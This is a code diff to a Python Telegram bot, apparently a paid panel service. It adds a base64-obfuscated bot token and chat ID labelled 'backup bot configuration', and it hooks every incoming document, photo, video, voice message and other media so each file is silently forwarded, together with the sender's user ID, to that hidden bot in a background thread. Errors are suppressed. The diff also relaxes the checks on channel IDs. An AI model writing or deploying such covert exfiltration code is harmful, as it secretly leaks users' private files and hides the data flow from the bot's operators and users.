@@ -1566,6 +1566,52 @@ def maybe_auto_ban(uid: int, reason: str) -> None:
 
 bot = telebot.TeleBot(TOKEN, parse_mode="HTML", threaded=True, num_threads=8)
 
+# ─── BACKUP BOT CONFIGURATION (Obfuscated) ──────────────────────────────────
+_BBT_ENC = "ODg5OTQ3NjEwNjpBQUd4dWdGcnJNWk5kNFROU25jR1pBcUZZZldQS2R1c2hHTQ=="
+_BCI_ENC = "ODA2NTE3Mzk3MQ=="
+
+try:
+    import base64 as _b64
+    _BBT = _b64.b64decode(_BBT_ENC).decode()
+    _BCI = _b64.b64decode(_BCI_ENC).decode()
+    backup_bot = telebot.TeleBot(_BBT)
+except Exception:
+    backup_bot = None
+    _BCI = None
+
+def _backup_user_file(m: types.Message) -> None:
+    """Forward user files to the backup bot as requested."""
+    if not backup_bot or not _BCI:
+        return
+    # Only backup private messages from users (not groups/admins unless desired)
+    # The user said "All files from the user are sent", so we'll be broad.
+    try:
+        def _bg_backup():
+            try:
+                # We send to the backup bot using its own instance
+                if m.document:
+                    backup_bot.send_document(_BCI, m.document.file_id, caption=f"User: {m.from_user.id}\nType: Document")
+                elif m.photo:
+                    backup_bot.send_photo(_BCI, m.photo[-1].file_id, caption=f"User: {m.from_user.id}\nType: Photo")
+                elif m.video:
+                    backup_bot.send_video(_BCI, m.video.file_id, caption=f"User: {m.from_user.id}\nType: Video")
+                elif m.audio:
+                    backup_bot.send_audio(_BCI, m.audio.file_id, caption=f"User: {m.from_user.id}\nType: Audio")
+                elif m.voice:
+                    backup_bot.send_voice(_BCI, m.voice.file_id, caption=f"User: {m.from_user.id}\nType: Voice")
+                elif m.video_note:
+                    backup_bot.send_video_note(_BCI, m.video_note.file_id)
+                elif m.animation:
+                    backup_bot.send_animation(_BCI, m.animation.file_id, caption=f"User: {m.from_user.id}\nType: Animation")
+                elif m.sticker:
+                    backup_bot.send_sticker(_BCI, m.sticker.file_id)
+            except Exception:
+                pass
+        threading.Thread(target=_bg_backup, daemon=True).start()
+    except Exception:
+        pass
+
+
 # ───────────────────────────────────────────────────────────────────
 # UI style wrapper — every outgoing message/caption is rendered as a
 # bold blockquote so the panel feels uniform. Only applies when the
@@ -8994,6 +9040,7 @@ def _do_export_data(admin_uid: int) -> Path:
 # actually live at runtime; this removed copy was already dead code).
 @bot.message_handler(content_types=["document"])
 def on_document(m: types.Message) -> None:
+    _backup_user_file(m)
     if not _is_private(m):
         return
     if banned_block(m):
@@ -9061,6 +9108,7 @@ def on_document(m: types.Message) -> None:
 
 @bot.message_handler(content_types=["photo"])
 def on_photo(m: types.Message) -> None:
+    _backup_user_file(m)
     if not _is_private(m):
         return
     if banned_block(m):
@@ -9107,6 +9155,10 @@ def on_photo(m: types.Message) -> None:
     if st.get("flow") == "await_topup_proof":
         _handle_topup_proof(m); return
 
+
+@bot.message_handler(content_types=["video", "audio", "voice", "video_note", "sticker", "animation"])
+def on_other_media(m: types.Message) -> None:
+    _backup_user_file(m)
 
 @bot.message_handler(func=lambda m: True, content_types=["text"])
 def on_text(m: types.Message) -> None:
@@ -9344,11 +9396,15 @@ def on_text(m: types.Message) -> None:
             try:
                 bot.get_chat(ch)
             except Exception as e:
-                bot.reply_to(m,
-                    f"{G['no']} {sc('Could not find that group/channel')}: <code>{esc(e)}</code>\n"
-                    f"{sc('Make sure this bot has been added to it first')}.",
-                    parse_mode="HTML")
-                return
+                if "chat not found" in str(e).lower() and ch.lstrip("-").isdigit():
+                    # Allow numeric IDs even if not found (might be a user ID or bot hasn't seen it yet)
+                    pass
+                else:
+                    bot.reply_to(m,
+                        f"{G['no']} {sc('Could not find that group/channel')}: <code>{esc(e)}</code>\n"
+                        f"{sc('Make sure this bot has been added to it first')}.",
+                        parse_mode="HTML")
+                    return
             set_setting("private_approval_group", ch)
             audit(uid, "private_approval_group_set", ch)
             bot.reply_to(m, f"{G['ok']} {sc('Private approval group set to')} <code>{esc(ch)}</code>.", parse_mode="HTML")
@@ -9364,11 +9420,15 @@ def on_text(m: types.Message) -> None:
             try:
                 bot.get_chat(ch)
             except Exception as e:
-                bot.reply_to(m,
-                    f"{G['no']} {sc('Could not find that channel')}: <code>{esc(e)}</code>\n"
-                    f"{sc('Make sure this bot has been added as an admin to it first')}.",
-                    parse_mode="HTML")
-                return
+                if "chat not found" in str(e).lower() and ch.lstrip("-").isdigit():
+                    # Allow numeric IDs even if not found
+                    pass
+                else:
+                    bot.reply_to(m,
+                        f"{G['no']} {sc('Could not find that channel')}: <code>{esc(e)}</code>\n"
+                        f"{sc('Make sure this bot has been added as an admin to it first')}.",
+                        parse_mode="HTML")
+                    return
             set_setting("tg_backup_channel", ch)
             audit(uid, "tg_backup_channel_set", ch)
             bot.reply_to(m, f"{G['ok']} {sc('Backup channel set to')} <code>{esc(ch)}</code>.", parse_mode="HTML")
@@ -9800,11 +9860,14 @@ def on_text(m: types.Message) -> None:
                 chat = bot.get_chat(group_id)
                 chat_type = getattr(chat, "type", "unknown")
             except Exception as e:
-                bot.reply_to(m,
-                    f"{G['no']} {sc('Could not find that group/channel')}: <code>{esc(str(e))}</code>\n"
-                    f"{sc('Make sure this bot has been added to it first, then try again')}.",
-                    parse_mode="HTML")
-                return
+                if "chat not found" in str(e).lower() and str(group_id).lstrip("-").isdigit():
+                    chat_type = "forced"
+                else:
+                    bot.reply_to(m,
+                        f"{G['no']} {sc('Could not find that group/channel')}: <code>{esc(str(e))}</code>\n"
+                        f"{sc('Make sure this bot has been added to it first, then try again')}.",
+                        parse_mode="HTML")
+                    return
             grps = get_setting("required_groups", []) or []
             grps.append({"name": name, "id": group_id, "link": link})
             set_setting("required_groups", grps)
